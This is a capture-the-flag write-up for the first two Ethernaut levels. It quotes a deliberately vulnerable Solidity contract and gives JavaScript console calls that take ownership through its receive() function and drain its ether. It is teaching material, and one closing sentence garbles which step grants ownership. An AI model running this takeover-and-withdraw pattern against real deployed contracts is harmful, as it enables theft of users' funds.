---
title: The Ethernaut CTF Writeup
date: 2022-12-08
categories: [writeup,ethernaut]
tags: [writeup,ethernaut] #always lowercase
---

This is a write-up for The Ethernaut CTF collection of challenges. The Ethernaut is a Web3/Solidity based wargame played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

## 1. Hello Ethernaut 🙌🏻
> This level walks you through the very basics of how to play the game.

This level exposes the basics in order to play the Ethernaut. `contract.info()` returns info from the 
contract. We receive: 'You will find what you need in info1().' `contract.info1()` returns 'Try info2(), but with "hello" as a parameter.' We already see a pattern where info methods will return instructions for nexts steps. In security, we need to be fast and work smart, not hard. We can use `contract.methods`, which returns all the methods for the contract. After checking all contract methods, see the `password()` method and the `authenticate()` method (which takes a string as param). We deduce that `password()` will return the parameter needed to authenticate ourselves via `authenticate()`. So we first run `password()`, which returns ethernaut0. We then call `authenticate()` with ethernaut0 as param and... voilà! First Ethernaut level completed ✅

## 2. Fallback 💰
> Look carefully at the contract's code below.
> You will beat this level if
> - you claim ownership of the contract
> - you reduce its balance to 0  
> 
> Things that might help: 
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see help() command)
> - Fallback methods

The second Ethernaut level consists in a contract that allows users to make contributions through `contribute()`. We can see in the `contribute()` method that if the contribution is higher than the highest contribution, we'll become the new contract owner.
``` solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
The contract has an initial owner which is set in the constructor, and only the owner is allowed to withdraw all the contract's funds via `withdraw()` (which has the well-known `onlyOwner` modifier):
``` solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```
We could become the owners by contributing more than the highest contribution, but this is a pretty high contribution done by the initial owner in the constructor (1000 ether), so we'll have to break the contract😈:
``` solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

```

We see that contract has a `receive()` method, which allows changing the owner of the contract just by sending an amount of ether higher than 0 if we have at least a contribution higher than 0:
``` solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
````

In Solidity, fallback functions `receive()` and `fallback()` are used in two different ways: 
- `receive()`: contract received ether and no data. If `receive()` does not exist in the contract, `fallback()` will be triggered. Forced to be `payable`.
- `fallback()`: contract received data but no function matched the function called, or contract received ether but no `receive()` function was found. Optionally `payable`.

Here's an easy diagram to better understand how receive and fallback work:
![diagram]()

Knowing this, we can contribute a small amount of ether via `contribute()` in order to bypass the `contributions[msg.sender] > 0` check:
```javascript
await contract.contribute({value: toWei('0.000000000001')});
```
If we check the owner via `contract.owner()` we see that it still is 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F. We still need to send the ether to trigger the receive() function.
We can do this just by sending some ether directly to the contract, and like this we can become the owner and then withdraw all contract's ether:
 
```javascript
await contract.send(toWei('0.000000000001'))
```

We'll see we are the owners now. The requirements for completing the level were becoming owners and draining the contract. Being the owners, we can directly call `withdraw()` and become the contract's owners.

```javascript
await contract.withdraw();
```
 Second Ethernaut level completed ✅